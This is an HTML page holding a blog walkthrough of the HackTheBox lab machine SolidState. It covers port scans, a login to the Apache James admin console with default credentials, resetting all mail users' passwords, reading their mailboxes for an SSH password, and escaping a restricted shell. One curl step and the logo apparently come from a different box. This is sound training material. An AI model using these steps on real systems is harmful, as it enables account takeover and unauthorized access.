@@ -1,0 +1,560 @@
+<!DOCTYPE html> <html lang="en"> <head> <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"> <meta charset="utf-8"> <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"> <meta http-equiv="X-UA-Compatible" content="IE=edge"> <title> SolidState | Biscotti Diskette </title> <meta name="author" content="Biscotti Diskette"> <meta name="description" content="SolidState from HackTheBox."> <meta name="keywords" content="jekyll, jekyll-theme, academic-website, portfolio-website"> <link rel="stylesheet" href="/assets/css/bootstrap.min.css?a4b3f509e79c54a512b890d73235ef04"> <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/css/mdb.min.css" integrity="sha256-jpjYvU3G3N6nrrBwXJoVEYI/0zw8htfFnhT9ljN3JJw=" crossorigin="anonymous"> <link defer rel="stylesheet" href="/assets/css/academicons.min.css?f0b7046b84e425c55f3463ac249818f5"> <link defer rel="stylesheet" href="/assets/css/scholar-icons.css?62b2ac103a88034e6882a5be5f3e2772"> <link defer rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700|Roboto+Slab:100,300,400,500,700|Material+Icons&amp;display=swap"> <link defer rel="stylesheet" href="/assets/css/jekyll-pygments-themes-github.css?591dab5a4e56573bf4ef7fd332894c99" media="" id="highlight_theme_light"> <link rel="shortcut icon" href="/assets/img/frontpage/Logo1.png?4f879aeff848659581251777fe0ab074"> <link rel="stylesheet" href="/assets/css/main.css?d41d8cd98f00b204e9800998ecf8427e"> <link rel="canonical" href="https://biscottidiskette.github.io/boxes/30_solidstate/"> <script src="/assets/js/theme.js?9a0c749ec5240d9cda97bc72359a72c0"></script> <link defer rel="stylesheet" href="/assets/css/jekyll-pygments-themes-native.css?5847e5ed4a4568527aa6cfab446049ca" media="none" id="highlight_theme_dark"> <script>
+    initTheme();
+  </script> </head> <body class="fixed-top-nav "> <header> <nav id="navbar" class="navbar navbar-light navbar-expand-sm fixed-top" role="navigation"> <div class="container"> <a class="navbar-brand title font-weight-lighter" href="/"> <span class="font-weight-bold">Biscotti</span> Diskette </a> <button class="navbar-toggler collapsed ml-auto" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation"> <span class="sr-only">Toggle navigation</span> <span class="icon-bar top-bar"></span> <span class="icon-bar middle-bar"></span> <span class="icon-bar bottom-bar"></span> </button> <div class="collapse navbar-collapse text-right" id="navbarNav"> <ul class="navbar-nav ml-auto flex-nowrap"> <li class="nav-item "> <a class="nav-link" href="/">about </a> </li> <li class="nav-item "> <a class="nav-link" href="/projects/">projects </a> </li> <li class="nav-item active"> <a class="nav-link" href="/boxes/">boxes <span class="sr-only">(current)</span> </a> </li> <li class="nav-item "> <a class="nav-link" href="/certifications/">certs </a> </li> <li class="nav-item "> <a class="nav-link" href="/bounties/">bounties </a> </li> <li class="nav-item "> <a class="nav-link" href="/cves/">cves </a> </li> <li class="nav-item "> <a class="nav-link" href="/presentations/">talks </a> </li> <li class="nav-item "> <a class="nav-link" href="/blog/">blog </a> </li> <li class="nav-item "> <a class="nav-link" href="/repositories/">repos </a> </li> <li class="nav-item "> <a class="nav-link" href="/publications/">publications </a> </li> <li class="toggle-container"> <button id="light-toggle" title="Change theme"> <i class="ti ti-sun-moon" id="light-toggle-system"></i> <i class="ti ti-moon-filled" id="light-toggle-dark"></i> <i class="ti ti-sun-filled" id="light-toggle-light"></i> </button> </li> </ul> </div> </div> </nav> <progress id="progress" value="0"> <div class="progress-container"> <span class="progress-bar"></span> </div> </progress> </header> <div class="container mt-5" role="main"> <div class="post"> <header class="post-header"> <h1 class="post-title">SolidState</h1> <p class="post-description">SolidState from HackTheBox.</p> </header> <article> <div class="row justify-content-sm-center"> <div class="col-sm-8 mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/cronos/logo.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="HTB SolidState Logo" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><br></p> <h2>Link</h2> <p><a href="https://app.hackthebox.com/machines/SolidState" rel="external nofollow noopener" target="_blank">Room Link</a></p> <p><br></p> <h2>Process</h2> <p><br> SolidState seems like a pretty solid choice for the next box!</p> <p>Run nmap and get a list of the ports.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/htb/solidstate]
+└─<span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-A</span> <span class="nt">-O</span> <span class="nt">-oN</span> nmap 10.10.10.51 
+<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>kali: 
+Starting Nmap 7.95 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2025-02-15 00:40 AEDT
+Nmap scan report <span class="k">for </span>10.10.10.51
+Host is up <span class="o">(</span>0.026s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 995 closed tcp ports <span class="o">(</span>reset<span class="o">)</span>
+PORT    STATE SERVICE VERSION
+22/tcp  open  ssh     OpenSSH 7.4p1 Debian 10+deb9u1 <span class="o">(</span>protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   2048 77:00:84:f5:78:b9:c7:d3:54:cf:71:2e:0d:52:6d:8b <span class="o">(</span>RSA<span class="o">)</span>
+|   256 78:b8:3a:f6:60:19:06:91:f5:53:92:1d:3f:48:ed:53 <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 e4:45:e9:ed:07:4d:73:69:43:5a:12:70:9d:c4:af:76 <span class="o">(</span>ED25519<span class="o">)</span>
+25/tcp  open  smtp    JAMES smtpd 2.3.2
+|_smtp-commands: solidstate Hello nmap.scanme.org <span class="o">(</span>10.10.16.12 <span class="o">[</span>10.10.16.12]<span class="o">)</span>
+80/tcp  open  http    Apache httpd 2.4.25 <span class="o">((</span>Debian<span class="o">))</span>
+|_http-title: Home - Solid State Security
+|_http-server-header: Apache/2.4.25 <span class="o">(</span>Debian<span class="o">)</span>
+110/tcp open  pop3    JAMES pop3d 2.3.2
+119/tcp open  nntp    JAMES nntpd <span class="o">(</span>posting ok<span class="o">)</span>
+Device <span class="nb">type</span>: general purpose
+Running: Linux 3.X|4.X
+OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+OS details: Linux 3.2 - 4.14
+Network Distance: 2 hops
+Service Info: Host: solidstate<span class="p">;</span> OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE <span class="o">(</span>using port 80/tcp<span class="o">)</span>
+HOP RTT      ADDRESS
+1   8.35 ms  10.10.16.1
+2   18.32 ms 10.10.10.51
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>115.42 seconds
+</code></pre></div></div> <p><br> Run nmap against all the ports to find any non-standard services.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/htb/solidstate]
+└─<span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sS</span> <span class="nt">-p-</span> <span class="nt">-oN</span> nmapfull 10.10.10.51 
+<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>kali: 
+Starting Nmap 7.95 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2025-02-15 00:41 AEDT
+Nmap scan report <span class="k">for </span>10.10.10.51
+Host is up <span class="o">(</span>0.043s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 65529 closed tcp ports <span class="o">(</span>reset<span class="o">)</span>
+PORT     STATE SERVICE
+22/tcp   open  ssh
+25/tcp   open  smtp
+80/tcp   open  http
+110/tcp  open  pop3
+119/tcp  open  nntp
+4555/tcp open  rsip
+
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>9.20 seconds
+</code></pre></div></div> <p><br> Run curl to see if there is any interesting information in the headers.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/htb/cronos]
+└─<span class="nv">$ </span>curl <span class="nt">-I</span> http://10.10.10.13
+HTTP/1.1 200 OK
+Date: Sat, 15 Feb 2025 10:41:49 GMT
+Server: Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)</span>
+Last-Modified: Fri, 01 Jan 2021 00:29:56 GMT
+ETag: <span class="s2">"2caf-5b7cbd6fbb19d"</span>
+Accept-Ranges: bytes
+Content-Length: 11439
+Vary: Accept-Encoding
+Content-Type: text/html
+</code></pre></div></div> <p><br> Check the landing page that is being served on port 80.</p> <div class="row justify-content-sm-center"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/solidstate/landing.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Port 80 Landing Page" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><br> Looking up the James mail. Apparently, it is maintained by Apache. So, the service running on port 4555 is the administration panel. I has the default credentials of root:root. Let’s use telnet to connect and test the creds. Netcat kept freezing.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/htb/solidstate]
+└─<span class="nv">$ </span>nc 10.10.10.51 4555
+JAMES Remote Administration Tool 2.3.2
+Please enter your login and password
+Login <span class="nb">id</span>:
+root
+Password:
+root
+Welcome root. HELP <span class="k">for </span>a list of commands
+</code></pre></div></div> <p><br> Type help to get a list of commands that we can run.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HELP 
+Currently implemented commands:
+<span class="nb">help                                    </span>display this <span class="nb">help
+</span>listusers                               display existing accounts
+countusers                              display the number of existing accounts
+adduser <span class="o">[</span>username] <span class="o">[</span>password]           add a new user
+verify <span class="o">[</span>username]                       verify <span class="k">if </span>specified user exist
+deluser <span class="o">[</span>username]                      delete existing user
+setpassword <span class="o">[</span>username] <span class="o">[</span>password]       sets a user<span class="s1">'s password
+setalias [user] [alias]                 locally forwards all email for '</span>user<span class="s1">' to '</span><span class="nb">alias</span><span class="s1">'
+showalias [username]                    shows a user'</span>s current email <span class="nb">alias
+</span>unsetalias <span class="o">[</span>user]                       unsets an <span class="nb">alias </span><span class="k">for</span> <span class="s1">'user'</span>
+setforwarding <span class="o">[</span>username] <span class="o">[</span>emailaddress] forwards a user<span class="s1">'s email to another email address
+showforwarding [username]               shows a user'</span>s current email forwarding
+unsetforwarding <span class="o">[</span>username]              removes a forward
+user <span class="o">[</span>repositoryname]                   change to another user repository
+shutdown                                kills the current JVM <span class="o">(</span>convenient when James is run as a daemon<span class="o">)</span>
+quit                                    close connection
+</code></pre></div></div> <p><br> Use the listusers to get a list of all the users on the mail system.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>listusers
+Existing accounts 5
+user: james
+user: thomas
+user: john
+user: mindy
+user: mailadmin
+</code></pre></div></div> <p><br> Reset all of their passwords so we can break into all of their mail accounts.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>setpassword james letmein
+Password <span class="k">for </span>james reset
+setpassword thomas letmein
+Password <span class="k">for </span>thomas reset
+setpassword john letmein
+Password <span class="k">for </span>john reset
+setpassword mindy letmein
+Password <span class="k">for </span>mindy reset
+setpassword mailadmin letmein
+Password <span class="k">for </span>mailadmin reset
+quit
+Bye
+</code></pre></div></div> <p><br> The first mailbox we will check is the John mailbox. It is asking to restrict Mindy’s account and assign her a temp password. Good to know.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/htb/solidstate]
+└─<span class="nv">$ </span>telnet 10.10.10.51 110
+Trying 10.10.10.51...
+Connected to 10.10.10.51.
+Escape character is <span class="s1">'^]'</span><span class="nb">.</span>
++OK solidstate POP3 server <span class="o">(</span>JAMES POP3 Server 2.3.2<span class="o">)</span> ready 
+USER john
++OK
+PASS letmein
++OK Welcome john
+LIST
++OK 1 743
+1 743
+<span class="nb">.</span>
+RETR 1
++OK Message follows
+Return-Path: &lt;mailadmin@localhost&gt;
+Message-ID: &lt;9564574.1.1503422198108.JavaMail.root@solidstate&gt;
+MIME-Version: 1.0
+Content-Type: text/plain<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>us-ascii
+Content-Transfer-Encoding: 7bit
+Delivered-To: john@localhost
+Received: from 192.168.11.142 <span class="o">([</span>192.168.11.142]<span class="o">)</span>
+          by solidstate <span class="o">(</span>JAMES SMTP Server 2.3.2<span class="o">)</span> with SMTP ID 581
+          <span class="k">for</span> &lt;john@localhost&gt;<span class="p">;</span>
+          Tue, 22 Aug 2017 13:16:20 <span class="nt">-0400</span> <span class="o">(</span>EDT<span class="o">)</span>
+Date: Tue, 22 Aug 2017 13:16:20 <span class="nt">-0400</span> <span class="o">(</span>EDT<span class="o">)</span>
+From: mailadmin@localhost
+Subject: New Hires access
+John, 
+
+Can you please restrict mindy<span class="s1">'s access until she gets read on to the program. Also make sure that you send her a tempory password to login to her accounts.
+
+Thank you in advance.
+
+Respectfully,
+James
+
+.
+</span></code></pre></div></div> <p><br> Let’s check Mindy’s account next since it was mentioned in John’s email. Hey, a password!</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/htb/solidstate]
+└─<span class="nv">$ </span>telnet 10.10.10.51 110
+Trying 10.10.10.51...
+Connected to 10.10.10.51.
+Escape character is <span class="s1">'^]'</span><span class="nb">.</span>
++OK solidstate POP3 server <span class="o">(</span>JAMES POP3 Server 2.3.2<span class="o">)</span> ready 
+USER mindy
++OK
+PASS letmein
++OK Welcome mindy
+LIST
++OK 2 1945
+1 1109
+2 836
+<span class="nb">.</span>
+RETR 1
++OK Message follows
+Return-Path: &lt;mailadmin@localhost&gt;
+Message-ID: &lt;5420213.0.1503422039826.JavaMail.root@solidstate&gt;
+MIME-Version: 1.0
+Content-Type: text/plain<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>us-ascii
+Content-Transfer-Encoding: 7bit
+Delivered-To: mindy@localhost
+Received: from 192.168.11.142 <span class="o">([</span>192.168.11.142]<span class="o">)</span>
+          by solidstate <span class="o">(</span>JAMES SMTP Server 2.3.2<span class="o">)</span> with SMTP ID 798
+          <span class="k">for</span> &lt;mindy@localhost&gt;<span class="p">;</span>
+          Tue, 22 Aug 2017 13:13:42 <span class="nt">-0400</span> <span class="o">(</span>EDT<span class="o">)</span>
+Date: Tue, 22 Aug 2017 13:13:42 <span class="nt">-0400</span> <span class="o">(</span>EDT<span class="o">)</span>
+From: mailadmin@localhost
+Subject: Welcome
+
+Dear Mindy,
+Welcome to Solid State Security Cyber team! We are delighted you are joining us as a junior defense analyst. Your role is critical <span class="k">in </span>fulfilling the mission of our orginzation. The enclosed information is designed to serve as an introduction to Cyber Security and provide resources that will <span class="nb">help </span>you make a smooth transition into your new role. The Cyber team is here to support your transition so, please know that you can call on any of us to assist you.
+
+We are looking forward to you joining our team and your success at Solid State Security. 
+
+Respectfully,
+James
+<span class="nb">.</span>
+RETR 2
++OK Message follows
+Return-Path: &lt;mailadmin@localhost&gt;
+Message-ID: &lt;16744123.2.1503422270399.JavaMail.root@solidstate&gt;
+MIME-Version: 1.0
+Content-Type: text/plain<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>us-ascii
+Content-Transfer-Encoding: 7bit
+Delivered-To: mindy@localhost
+Received: from 192.168.11.142 <span class="o">([</span>192.168.11.142]<span class="o">)</span>
+          by solidstate <span class="o">(</span>JAMES SMTP Server 2.3.2<span class="o">)</span> with SMTP ID 581
+          <span class="k">for</span> &lt;mindy@localhost&gt;<span class="p">;</span>
+          Tue, 22 Aug 2017 13:17:28 <span class="nt">-0400</span> <span class="o">(</span>EDT<span class="o">)</span>
+Date: Tue, 22 Aug 2017 13:17:28 <span class="nt">-0400</span> <span class="o">(</span>EDT<span class="o">)</span>
+From: mailadmin@localhost
+Subject: Your Access
+
+Dear Mindy,
+
+
+Here are your ssh credentials to access the system. Remember to reset your password after your first login. 
+Your access is restricted at the moment, feel free to ask your supervisor to add any commands you need to your path. 
+
+username: mindy
+pass: P@55W0rd1!2@
+
+Respectfully,
+James
+
+<span class="nb">.</span>
+QUIT
++OK Apache James POP3 Server signing off.
+Connection closed by foreign host.
+</code></pre></div></div> <p><br> Check the other boxes if you feel the need. None of them have anything interesting.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/htb/solidstate]
+└─<span class="nv">$ </span>telnet 10.10.10.51 110     
+Trying 10.10.10.51...
+Connected to 10.10.10.51.
+Escape character is <span class="s1">'^]'</span><span class="nb">.</span>
++OK solidstate POP3 server <span class="o">(</span>JAMES POP3 Server 2.3.2<span class="o">)</span> ready 
+USER james
++OK
+PASS letmein
++OK Welcome james
+LIST
++OK 0 0
+<span class="nb">.</span>
+QUIT
++OK Apache James POP3 Server signing off.
+Connection closed by foreign host.
+</code></pre></div></div> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/htb/solidstate]
+└─<span class="nv">$ </span>telnet 10.10.10.51 110
+Trying 10.10.10.51...
+Connected to 10.10.10.51.
+Escape character is <span class="s1">'^]'</span><span class="nb">.</span>
++OK solidstate POP3 server <span class="o">(</span>JAMES POP3 Server 2.3.2<span class="o">)</span> ready 
+USER thomas
++OK
+PASS letmein
++OK Welcome thomas
+LIST
++OK 0 0
+<span class="nb">.</span>
+QUIT
++OK Apache James POP3 Server signing off.
+Connection closed by foreign host.
+</code></pre></div></div> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/htb/solidstate]
+└─<span class="nv">$ </span>telnet 10.10.10.51 110
+Trying 10.10.10.51...
+Connected to 10.10.10.51.
+Escape character is <span class="s1">'^]'</span><span class="nb">.</span>
++OK solidstate POP3 server <span class="o">(</span>JAMES POP3 Server 2.3.2<span class="o">)</span> ready 
+USER mailadmin
++OK
+PASS letmein
++OK Welcome mailadmin
+LIST
++OK 0 0
+<span class="nb">.</span>
+QUIT
++OK Apache James POP3 Server signing off.
+Connection closed by foreign host.
+</code></pre></div></div> <p><br> Use the creds from Mindy’s email to ssh into the server.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/htb/solidstate]
+└─<span class="nv">$ </span>ssh mindy@10.10.10.51                          
+The authenticity of host <span class="s1">'10.10.10.51 (10.10.10.51)'</span> can<span class="s1">'t be established.
+ED25519 key fingerprint is SHA256:rC5LxqIPhybBFae7BXE/MWyG4ylXjaZJn6z2/1+GmJg.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '</span>10.10.10.51<span class="s1">' (ED25519) to the list of known hosts.
+mindy@10.10.10.51'</span>s password: 
+Linux solidstate 4.9.0-3-686-pae <span class="c">#1 SMP Debian 4.9.30-2+deb9u3 (2017-08-06) i686</span>
+
+The programs included with the Debian GNU/Linux system are free software<span class="p">;</span>
+the exact distribution terms <span class="k">for </span>each program are described <span class="k">in </span>the
+individual files <span class="k">in</span> /usr/share/doc/<span class="k">*</span>/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Tue Aug 22 14:00:02 2017 from 192.168.11.142
+mindy@solidstate:~<span class="err">$</span>
+</code></pre></div></div> <p><br> Confirm the rbash shell.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mindy@solidstate:~<span class="nv">$ </span><span class="nb">whoami</span>
+<span class="nt">-rbash</span>: <span class="nb">whoami</span>: <span class="nb">command </span>not found
+</code></pre></div></div> <p><br> Research different rbash escape methods.</p> <p><a href="https://systemweakness.com/how-to-breakout-of-rbash-restricted-bash-4e07f0fd95e" rel="external nofollow noopener" target="_blank">https://systemweakness.com/how-to-breakout-of-rbash-restricted-bash-4e07f0fd95e</a><br> <a href="https://gist.github.com/PSJoshi/04c0e239ac7b486efb3420db4086e290" rel="external nofollow noopener" target="_blank">https://gist.github.com/PSJoshi/04c0e239ac7b486efb3420db4086e290</a><br> <a href="https://speakerdeck.com/knaps/escape-from-shellcatraz-breaking-out-of-restricted-unix-shells?slide=9" rel="external nofollow noopener" target="_blank">https://speakerdeck.com/knaps/escape-from-shellcatraz-breaking-out-of-restricted-unix-shells?slide=9</a></p> <div class="row justify-content-sm-center"> <div class="col-s-8 mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/solidstate/escape.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Escape Research" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><br> Check the environment variables.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mindy@solidstate:~<span class="nv">$ </span><span class="nb">export</span> <span class="nt">-p</span>
+<span class="nb">declare</span> <span class="nt">-x</span> <span class="nv">DBUS_SESSION_BUS_ADDRESS</span><span class="o">=</span><span class="s2">"unix:path=/run/user/1001/bus"</span>
+<span class="nb">declare</span> <span class="nt">-x</span> <span class="nv">HOME</span><span class="o">=</span><span class="s2">"/home/mindy"</span>
+<span class="nb">declare</span> <span class="nt">-x</span> <span class="nv">LANG</span><span class="o">=</span><span class="s2">"en_US.UTF-8"</span>
+<span class="nb">declare</span> <span class="nt">-x</span> <span class="nv">LOGNAME</span><span class="o">=</span><span class="s2">"mindy"</span>
+<span class="nb">declare</span> <span class="nt">-x</span> <span class="nv">MAIL</span><span class="o">=</span><span class="s2">"/var/mail/mindy"</span>
+<span class="nb">declare</span> <span class="nt">-x</span> OLDPWD
+<span class="nb">declare</span> <span class="nt">-rx</span> <span class="nv">PATH</span><span class="o">=</span><span class="s2">"/home/mindy/bin"</span>
+<span class="nb">declare</span> <span class="nt">-x</span> <span class="nv">PWD</span><span class="o">=</span><span class="s2">"/home/mindy"</span>
+<span class="nb">declare</span> <span class="nt">-rx</span> <span class="nv">SHELL</span><span class="o">=</span><span class="s2">"/bin/rbash"</span>
+<span class="nb">declare</span> <span class="nt">-x</span> <span class="nv">SHLVL</span><span class="o">=</span><span class="s2">"1"</span>
+<span class="nb">declare</span> <span class="nt">-x</span> <span class="nv">SSH_CLIENT</span><span class="o">=</span><span class="s2">"10.10.16.12 57662 22"</span>
+<span class="nb">declare</span> <span class="nt">-x</span> <span class="nv">SSH_CONNECTION</span><span class="o">=</span><span class="s2">"10.10.16.12 57662 10.10.10.51 22"</span>
+<span class="nb">declare</span> <span class="nt">-x</span> <span class="nv">SSH_TTY</span><span class="o">=</span><span class="s2">"/dev/pts/0"</span>
+<span class="nb">declare</span> <span class="nt">-x</span> <span class="nv">TERM</span><span class="o">=</span><span class="s2">"xterm-256color"</span>
+<span class="nb">declare</span> <span class="nt">-x</span> <span class="nv">USER</span><span class="o">=</span><span class="s2">"mindy"</span>
+<span class="nb">declare</span> <span class="nt">-x</span> <span class="nv">XDG_RUNTIME_DIR</span><span class="o">=</span><span class="s2">"/run/user/1001"</span>
+<span class="nb">declare</span> <span class="nt">-x</span> <span class="nv">XDG_SESSION_ID</span><span class="o">=</span><span class="s2">"17"</span>
+</code></pre></div></div> <p><br> Try updating the PATH.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mindy@solidstate:~<span class="nv">$ </span><span class="nb">export </span><span class="nv">PATH</span><span class="o">=</span><span class="nv">$PATH</span>:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+<span class="nt">-rbash</span>: PATH: <span class="nb">readonly </span>variable
+</code></pre></div></div> <p><br> Check the bin folder to see what we can run.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mindy@solidstate:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span> bin/
+total 8
+drwxr-x--- 2 mindy mindy 4096 Apr 26  2021 <span class="nb">.</span>
+drwxr-x--- 4 mindy mindy 4096 Apr 26  2021 ..
+lrwxrwxrwx 1 root  root     8 Aug 22  2017 <span class="nb">cat</span> -&gt; /bin/cat
+lrwxrwxrwx 1 root  root     8 Aug 22  2017 <span class="nb">env</span> -&gt; /bin/env
+lrwxrwxrwx 1 root  root     7 Aug 22  2017 <span class="nb">ls</span> -&gt; /bin/ls
+</code></pre></div></div> <p><br> Run compgen -c to get a list of commands that we can run.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mindy@solidstate:~<span class="nv">$ </span><span class="nb">compgen</span> <span class="nt">-c</span>
+<span class="k">if
+then
+else
+elif
+fi
+case</span>
+<span class="k">esac</span>
+<span class="k">for
+select
+while
+until</span>
+
+&lt;snip&gt;
+</code></pre></div></div> <p><br> Logout of the ssh session and log back in using the -t option with no profile to try and stop the rbash from loading.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/htb/solidstate]
+└─<span class="nv">$ </span>ssh mindy@10.10.10.51 <span class="nt">-t</span> <span class="s2">"bash --noprofile"</span>
+mindy@10.10.10.51<span class="s1">'s password: 
+${debian_chroot:+($debian_chroot)}mindy@solidstate:~$
+</span></code></pre></div></div> <p><br> Get the user.txt flag.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">${</span><span class="nv">debian_chroot</span>:+<span class="p">(</span><span class="nv">$debian_chroot</span><span class="p">)</span><span class="k">}</span>mindy@solidstate:~<span class="nv">$ </span><span class="nb">cat </span>user.txt
+&lt;redacted&gt;
+<span class="k">${</span><span class="nv">debian_chroot</span>:+<span class="p">(</span><span class="nv">$debian_chroot</span><span class="p">)</span><span class="k">}</span>mindy@solidstate:~<span class="nv">$ </span>ip a
+1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
+    <span class="nb">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host 
+       valid_lft forever preferred_lft forever
+2: ens192: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000
+    <span class="nb">link</span>/ether 00:50:56:b9:44:de brd ff:ff:ff:ff:ff:ff
+    inet 10.10.10.51/24 brd 10.10.10.255 scope global ens192
+       valid_lft forever preferred_lft forever
+    inet6 dead:beef::250:56ff:feb9:44de/64 scope global mngtmpaddr dynamic 
+       valid_lft 86396sec preferred_lft 14396sec
+    inet6 fe80::250:56ff:feb9:44de/64 scope <span class="nb">link 
+       </span>valid_lft forever preferred_lft forever
+</code></pre></div></div> <p><br> Run uname -a to get the Linux version.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">${</span><span class="nv">debian_chroot</span>:+<span class="p">(</span><span class="nv">$debian_chroot</span><span class="p">)</span><span class="k">}</span>mindy@solidstate:~<span class="nv">$ </span><span class="nb">uname</span> <span class="nt">-a</span>
+Linux solidstate 4.9.0-3-686-pae <span class="c">#1 SMP Debian 4.9.30-2+deb9u3 (2017-08-06) i686 GNU/Linux</span>
+</code></pre></div></div> <p><br> Download linpeas.sh to the local working folder.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/htb/solidstate]
+└─<span class="nv">$ </span>wget https://github.com/peass-ng/PEASS-ng/releases/download/20250202-a3a1123d/linpeas.sh
+<span class="nt">--2025-02-15</span> 01:41:46--  https://github.com/peass-ng/PEASS-ng/releases/download/20250202-a3a1123d/linpeas.sh
+Resolving github.com <span class="o">(</span>github.com<span class="o">)</span>... 140.82.112.3
+Connecting to github.com <span class="o">(</span>github.com<span class="o">)</span>|140.82.112.3|:443... connected.
+HTTP request sent, awaiting response... 302 Found
+Location: https://objects.githubusercontent.com/github-production-release-asset-2e65be/165548191/d73618c9-7a15-48f8-8489-affff6078781?X-Amz-Algorithm<span class="o">=</span>AWS4-HMAC-SHA256&amp;X-Amz-Credential<span class="o">=</span>releaseassetproduction%2F20250214%2Fus-east-1%2Fs3%2Faws4_request&amp;X-Amz-Date<span class="o">=</span>20250214T144149Z&amp;X-Amz-Expires<span class="o">=</span>300&amp;X-Amz-Signature<span class="o">=</span>2a6471c22bfa85c72408dbd4f01a7d79a970a862af17c2775c00401bd3555157&amp;X-Amz-SignedHeaders<span class="o">=</span>host&amp;response-content-disposition<span class="o">=</span>attachment%3B%20filename%3Dlinpeas.sh&amp;response-content-type<span class="o">=</span>application%2Foctet-stream <span class="o">[</span>following]
